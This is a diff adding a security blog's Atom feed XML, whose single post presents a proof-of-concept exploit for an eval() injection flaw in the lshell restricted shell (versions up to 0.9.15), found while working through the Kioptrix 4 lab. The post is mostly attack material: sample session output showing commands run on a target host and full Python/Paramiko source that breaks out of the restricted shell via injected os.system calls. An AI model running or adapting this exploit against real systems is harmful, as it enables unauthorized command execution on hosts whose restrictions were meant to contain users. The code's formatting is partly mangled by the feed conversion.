@@ -1,0 +1,162 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: pathing | forelsec]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/pathing/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2014-03-04T23:05:46-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[lshell 0.9.15 pathing vulnerability]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability/"/>
+    <updated>2012-12-30T22:43:42-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability</id>
+    <content type="html"><![CDATA[<p>While working through Kioptrix level 4, I stumbled into <a href="https://github.com/ghantoos/lshell">lshell</a>, a limited shell environment developed in Python.  I don&rsquo;t want to walk through the vulnerability again, but at a high level versions &lt;= 0.9.15 are vulnerable to an unsanitized eval() call with user supplied input.  I couldn&rsquo;t find a working PoC, so I wrote one.</p>
+
+<p>This will verify the install and spawn a pseudo-shell for running commands on the remote host.  While it may be more beneficial to just log in and run the exploit to spawn /bin/bash, this is a nice hacky way to quickly enumerate and tool around on the back end:</p>
+
+<p><code>
+root@bt:~/kioptrix_l4# python lshell_remote.py john ****** 192.168.1.39
+[!] .............................
+[!] lshell &lt;= 0.9.15 remote shell.
+[!] note: you can also ssh in and execute '/bin/bash'
+[!] .............................
+[!] Checking host 192.168.1.39...
+[+] vulnerable lshell found, preparing pseudo-shell...
+$ id
+uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
+$ ls -l
+total 48
+-rwxr-xr-x 1 john john  1544 2009-01-20 19:51 install.sh
+-rw-r--r-- 1 john john  7715 2009-01-20 19:06 lib_mysqludf_sys.c
+-rw-r--r-- 1 john john  9934 2009-01-21 19:42 lib_mysqludf_sys.html
+-rwxr-xr-x 1 john john 12896 2009-01-19 04:11 lib_mysqludf_sys.so
+-rw-r--r-- 1 john john  1647 2009-01-21 19:43 lib_mysqludf_sys.sql
+-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
+$ ls -l | grep 'Makefile'
+-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
+$ exit
+root@bt:~/kioptrix_l4#
+</code></p>
+
+<p>You can run pretty much everything except for binary files; this is because of the shell environment changing. I wasn&rsquo;t able to figure out a clean way to attach a TTY to the stdin/stdout/stderr, so if anyone knows of a way to do this with Paramiko, drop me a message.  I&rsquo;ll take any bug reports as well.  This requires Paramiko libraries to be installed; tested with Python 2.7.x.</p>
+
+<p><a href="http://pastebin.com/r7LCdeTC">Pastebin</a> link for download and code:</p>
+
+<p>```
+import paramiko
+import traceback
+from time import sleep</p>
+
+<p>#</p>
+
+<h1>Exploit lshell pathing vulnerability in &lt;= 0.9.15.</h1>
+
+<h1>Runs commands on the remote system.</h1>
+
+<h1>@dronesec</h1>
+
+<p>#</p>
+
+<p>if len(sys.argv) &lt; 4:</p>
+
+<pre><code>print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
+sys.exit(1)
+</code></pre>
+
+<p>try:</p>
+
+<pre><code>print '[!] .............................'
+print '[!] lshell &lt;= 0.9.15 remote shell.'
+print '[!] note: you can also ssh in and execute \'/bin/bash\''
+print '[!] .............................'
+print '[!] Checking host %s...'%(sys.argv[3])
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+if len(sys.argv) == 5:
+    ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
+else:
+    ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
+
+
+# verify lshell 
+channel = ssh.invoke_shell()
+while not channel.recv_ready(): sleep(1)
+ret = channel.recv(2048)
+
+channel.send('help help\n')
+while not channel.recv_ready(): sleep(1)
+ret = channel.recv(2048)
+
+if not 'lshell' in ret:
+    if 'forbidden' in ret:
+        print '[-] Looks like we can\'t execute SSH commands'
+    else:
+        print '[-] Environment is not lshell'
+    sys.exit(1)
+
+# verify vulnerable version
+channel.send('sudo\n')
+while not channel.recv_ready(): sleep(1)
+ret = channel.recv(2048)
+if not 'Traceback' in ret:
+    print '[-] lshell version not vulnerable.'
+    sys.exit(1)
+channel.close()
+ssh.close()
+
+# exec shell
+print '[+] vulnerable lshell found, preparing pseudo-shell...'
+if len(sys.argv) == 5:
+    ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
+else:
+    ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
+
+while True:
+    cmd = raw_input('$ ')
+
+    # breaks paramiko
+    if cmd[0] is '/':
+        print '[!] Running binaries won\'t work!'
+        continue
+
+    cmd = cmd.replace("'", r"\'")
+    cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
+    if len(cmd) &gt; 1:
+        if 'quit' in cmd or 'exit' in cmd:
+            break
+        (stdin,stdout,stderr) = ssh.exec_command(cmd)
+    out = stdout.read()
+    print out.strip()
+</code></pre>
+
+<p>except paramiko.AuthenticationException:</p>
+
+<pre><code>print '[-] Authentication to %s failed.'%sys.argv[3]
+</code></pre>
+
+<p>except Exception, e:</p>
+
+<pre><code>print '[-] Error: ', e
+print type(e)
+traceback.print_exc(file=sys.stdout)
+</code></pre>
+
+<p>finally:</p>
+
+<pre><code>channel.close()
+ssh.close()
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
+  
+</feed>
